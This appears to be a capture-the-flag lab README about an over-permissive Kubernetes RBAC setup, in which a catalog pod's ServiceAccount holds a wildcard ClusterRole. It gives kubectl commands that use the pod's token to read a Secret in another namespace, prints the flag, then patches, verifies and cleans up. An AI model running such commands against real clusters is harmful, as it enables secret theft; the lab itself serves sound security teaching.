# K02 — Overly Permissive Authorization Configurations · NimbusMart CTF

**Difficulty:** Hard · **300 pts** · **Flag:** `FLAG{...}`

## Briefing
You've compromised NimbusMart's `storefront/catalog-api` pod. It looks like an
ordinary product-catalog service — but its ServiceAccount was bound to a
**wildcard ClusterRole** (`verbs/resources/apiGroups: ["*"]`) so it can act on
anything, anywhere in the cluster. The crown jewels live in the `nimbusmart-ops`
namespace: a Secret called `master-vault` the storefront should never be able to
touch.

**Objective:** use the pod's over-permissioned token to read the `master-vault`
Secret in `nimbusmart-ops` and capture the flag.

## Capture the flag
```bash
# Seed the ops vault + deploy the over-permissioned catalog-api pod
kubectl apply -f setup.yaml
kubectl apply -f vulnerable.yaml

# The pod's SA can do anything, anywhere — confirm it
kubectl exec -n storefront catalog-api -- \
  kubectl auth can-i --list

# Read the ops vault from another namespace using the pod's own token
kubectl exec -n storefront catalog-api -- \
  kubectl get secret master-vault -n nimbusmart-ops -o jsonpath='{.data.flag}' | base64 -d
#  -> FLAG{wildcard_rbac_opens_the_ops_vault}
```

## Patch & verify
```bash
kubectl delete -f vulnerable.yaml
kubectl apply -f fixed.yaml

# The cluster-wide wildcard is gone. The SA can read configmaps in storefront,
# but reading the ops vault is now Forbidden — the flag is unreachable.
kubectl exec -n storefront catalog-api -- \
  kubectl get secret master-vault -n nimbusmart-ops 2>&1 || echo FORBIDDEN

# Prove it with the checker
cd ../../checker && go run . --check k02 -n storefront
```

## Cleanup
```bash
kubectl delete -f vulnerable.yaml -f fixed.yaml -f setup.yaml --ignore-not-found
```
